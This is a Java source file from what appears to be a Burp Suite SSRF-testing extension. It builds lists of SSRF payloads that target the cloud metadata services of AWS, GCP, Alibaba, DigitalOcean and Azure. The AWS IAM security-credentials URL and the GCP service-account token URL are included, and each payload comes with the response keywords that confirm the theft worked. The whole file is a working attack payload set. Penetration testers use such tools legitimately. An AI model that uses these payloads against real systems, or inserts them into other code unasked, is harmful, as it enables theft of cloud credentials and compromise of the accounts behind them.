// Created with the help of an AI Agent and littlespidy.
package burp.ssrfmap.modules;

import burp.ssrfmap.model.SSRFModuleCategory_littlespidy;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.List;

public class CloudMetadataModules_littlespidy {

    public static List<SSRFPayloadItem_littlespidy> getPayloads(String provider) {
        List<SSRFPayloadItem_littlespidy> items = new ArrayList<>();
        String p = provider.toLowerCase();

        switch (p) {
            case "aws":
                items.add(new SSRFPayloadItem_littlespidy(
                        SSRFModuleCategory_littlespidy.CLOUD, "aws", "http://",
                        "AWS EC2 IMDSv1 Metadata Root",
                        "http://169.254.169.254/latest/meta-data/",
                        Arrays.asList("ami-id", "iam", "instance-id", "local-ipv4"),
                        false));
                items.add(new SSRFPayloadItem_littlespidy(
                        SSRFModuleCategory_littlespidy.CLOUD, "aws", "http://",
                        "AWS EC2 IAM Security Credentials",
                        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                        Collections.singletonList("Code"),
                        false));
                items.add(new SSRFPayloadItem_littlespidy(
                        SSRFModuleCategory_littlespidy.CLOUD, "aws", "http://",
                        "AWS EC2 User-Data script",
                        "http://169.254.169.254/latest/user-data",
                        Collections.emptyList(),
                        false));
                break;

            case "gcp":
                items.add(new SSRFPayloadItem_littlespidy(
                        SSRFModuleCategory_littlespidy.CLOUD, "gcp", "http://",
                        "GCP Metadata Service Root",
                        "http://metadata.google.internal/computeMetadata/v1/?recursive=true",
                        Arrays.asList("instance", "project", "computeMetadata"),
                        false));
                items.add(new SSRFPayloadItem_littlespidy(
                        SSRFModuleCategory_littlespidy.CLOUD, "gcp", "http://",
                        "GCP Service Account Token",
                        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                        Arrays.asList("access_token", "token_type"),
                        false));
                break;

            case "alibaba":
                items.add(new SSRFPayloadItem_littlespidy(
                        SSRFModuleCategory_littlespidy.CLOUD, "alibaba", "http://",
                        "Alibaba Cloud ECS Metadata",
                        "http://100.100.100.200/latest/meta-data/",
                        Arrays.asList("instance-id", "image-id", "ram/security-credentials/"),
                        false));
                break;

            case "digitalocean":
                items.add(new SSRFPayloadItem_littlespidy(
                        SSRFModuleCategory_littlespidy.CLOUD, "digitalocean", "http://",
                        "DigitalOcean Droplet Metadata JSON",
                        "http://169.254.169.254/metadata/v1.json",
                        Arrays.asList("droplet_id", "hostname", "vendor_data"),
                        false));
                break;

            case "azure":
                items.add(new SSRFPayloadItem_littlespidy(
                        SSRFModuleCategory_littlespidy.CLOUD, "azure", "http://",
                        "Azure Instance Metadata Service",
                        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                        Arrays.asList("compute", "vmId", "subscriptionId"),
                        false));
                break;
        }

        return items;
    }

    public static List<SSRFPayloadItem_littlespidy> getAllCloudPayloads() {
        List<SSRFPayloadItem_littlespidy> all = new ArrayList<>();
        all.addAll(getPayloads("aws"));
        all.addAll(getPayloads("gcp"));
        all.addAll(getPayloads("alibaba"));
        all.addAll(getPayloads("digitalocean"));
        all.addAll(getPayloads("azure"));
        return all;
    }
}
